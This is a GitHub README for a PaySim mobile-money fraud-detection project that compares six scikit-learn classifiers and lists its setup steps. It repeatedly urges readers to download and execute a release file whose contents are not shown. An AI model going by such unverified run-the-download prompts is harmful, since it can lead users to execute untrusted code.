# Mobile Money Fraud Detection — PaySim ML Benchmark Project

[![Releases](https://img.shields.io/badge/Releases-download-blue?logo=github)](https://github.com/Habib832/Kaggle-Fraud.ipynb/releases)  
https://github.com/Habib832/Kaggle-Fraud.ipynb/releases

![Fraud detection hero](https://images.unsplash.com/photo-1532619187606-0b0a7f1d9b7b?auto=format&fit=crop&w=1200&q=80)

Overview
-------
This repository contains a full machine learning pipeline for fraud detection in mobile money transactions. It uses the PaySim synthetic dataset. The work treats fraud detection as a binary classification task. It compares six models: Logistic Regression, Naive Bayes, Decision Tree, Random Forest, K-Nearest Neighbors (KNN), and Support Vector Machine (SVM).

Key components:
- Data loading and cleaning
- Feature engineering
- Class balancing
- Model training and tuning
- Feature importance analysis
- Model evaluation with accuracy, precision, recall, F1, ROC, and confusion matrix heatmap

Badges & Links
-------
[![Releases](https://img.shields.io/badge/Download%20Release-Click%20Here-brightgreen?logo=github)](https://github.com/Habib832/Kaggle-Fraud.ipynb/releases)

Download the release file from the link above and execute the Jupyter notebook. The release contains the runnable .ipynb file and any packaged assets. If the link fails, check the "Releases" section on the repository page.

Repository topics
-------
Tags used for discovery:
- bayes-classifier
- classification
- classification-algorithm
- confusion-matrix-heatmap
- decision-tree-classifier
- feature-engineering
- fraud
- fraud-detection
- fraudulent-transactions-detection
- logistic-regression-classifier
- machine-learning
- machine-learning-algorithms

What you will find in the notebook
-------
- Clear data ingestion from CSV (PaySim).
- Exploratory data analysis (EDA): class imbalance, transaction types, basic stats, and visual checks.
- Missing value handling and outlier treatment.
- Categorical encoding and scaling for numeric features.
- Class balancing via SMOTE and undersampling experiments.
- Six core models with baseline and tuned runs:
  - Logistic Regression
  - Naive Bayes (Gaussian)
  - Decision Tree
  - Random Forest
  - K-Nearest Neighbors (KNN)
  - Support Vector Machine (SVM)
- Feature importance using Random Forest and permutation importance.
- Model evaluation with:
  - Accuracy
  - Precision
  - Recall
  - F1-score
  - ROC AUC
  - Confusion matrix and heatmap
- Visuals: feature distributions, correlation matrix, ROC curves, confusion matrix heatmaps.

Dataset
-------
Dataset: PaySim synthetic mobile money transactions. Typical fields:
- step — time step
- type — transaction type (PAYMENT, CASH_OUT, TRANSFER, etc.)
- amount — transaction amount
- nameOrig, nameDest — anonymized IDs
- oldbalanceOrg, newbalanceOrig, oldbalanceDest, newbalanceDest
- isFraud — target (1 = fraud, 0 = legitimate)

The notebook shows a reproducible pipeline to convert these raw fields into model-ready features.

Setup and run
-------
1. Download the release file and assets from:
   https://github.com/Habib832/Kaggle-Fraud.ipynb/releases
   The release contains the notebook file that you must download and execute.

2. Create a recommended Python environment:
```
python -m venv .venv
source .venv/bin/activate   # macOS / Linux
.venv\Scripts\activate      # Windows
pip install --upgrade pip
pip install -r requirements.txt
```

3. Launch Jupyter:
```
jupyter lab
```
4. Open the downloaded Kaggle-Fraud.ipynb notebook and run the cells in order.

Minimal requirements
-------
- Python 3.8+
- pandas
- numpy
- scikit-learn
- imbalanced-learn
- matplotlib
- seaborn
- jupyterlab or notebook

A sample requirements.txt (included in release):
```
pandas>=1.2
numpy>=1.19
scikit-learn>=0.24
imbalanced-learn>=0.8
matplotlib>=3.3
seaborn>=0.11
jupyterlab>=3.0
```

Data preprocessing steps
-------
- Remove exact duplicate rows.
- Convert transaction type to one-hot or label encode.
- Drop identifier fields that leak info (anonymized IDs) or derive aggregation features instead.
- Impute missing values with median for numeric columns.
- Scale numeric features using StandardScaler for distance-based models.
- Create derived features:
  - balance change flags
  - relative transaction amount (amount / mean_balance)
  - transaction hour/step buckets
- Apply SMOTE on training split to balance classes while preserving test distribution.

Modeling approach
-------
- Split into train/test with stratify on isFraud.
- Use cross-validation for hyperparameter search (GridSearchCV or RandomizedSearchCV).
- Evaluate models on holdout test set.
- Keep a fixed random_state for reproducibility.
- Record metrics in a comparison table and generate ROC curves.

Hyperparameters tuned
-------
Examples shown in notebook:
- Logistic Regression: C values, penalty (l2)
- Decision Tree: max_depth, min_samples_split
- Random Forest: n_estimators, max_depth
- KNN: n_neighbors, weights
- SVM: C and kernel
- Naive Bayes: var_smoothing

Feature importance
-------
- Use Random Forest feature_importances_ to rank features.
- Use permutation importance to assess model sensitivity.
- Visualize top features with bar charts.
- Use SHAP explanations for local model insight (optional; added as a usage example).

Evaluation & visual outputs
-------
- Confusion matrix heatmap for each model.
- ROC curves with AUC scores.
- Precision-recall curves for imbalanced class insight.
- Comparison table of metrics for easy selection.

Sample visuals included:
![Confusion matrix example](https://upload.wikimedia.org/wikipedia/commons/2/22/Confusion_matrix_heatmap.png)

Reproducibility
-------
- The notebook sets random_state in train_test_split and model constructors.
- The dataset split, SMOTE sampling, and cross-validation folds remain consistent.
- Save a pickled model and a CSV of metrics after run for quick review.

Expected results
-------
Results vary by run and hyperparameters. Typical findings in the notebook:
- Random Forest and Logistic Regression produce strong recall and F1 in many setups.
- Naive Bayes yields fast baselines for precision but lower recall.
- SVM can perform well after scaling but costs more time.
- KNN shows sensitivity to scaling and class balance.

File structure
-------
- Kaggle-Fraud.ipynb — main notebook (download from Releases and execute)
- requirements.txt — Python dependencies
- data/ — placeholder for raw PaySim CSV (not committed in release for size)
- results/ — exported metrics, models, and figures created by the notebook
- LICENSE — project license

How to cite or use
-------
Use this repository as a template for fraud detection experiments. Reuse preprocessing steps and model comparisons for other transaction datasets. The notebook comments contain notes on assumptions and design choices.

Contributing
-------
- Fork the repo.
- Create a branch per feature or fix.
- Open a pull request with tests or sample outputs.
- Add new models or preprocessors with clear cell headings.

License
-------
MIT License

Contact
-------
- GitHub: Habib832/Kaggle-Fraud.ipynb
- Releases and notebook download:
  https://github.com/Habib832/Kaggle-Fraud.ipynb/releases

Images and assets
-------
Hero image by Unsplash. Confusion matrix image from Wikimedia Commons. Use these images for visualization in the README and report exports.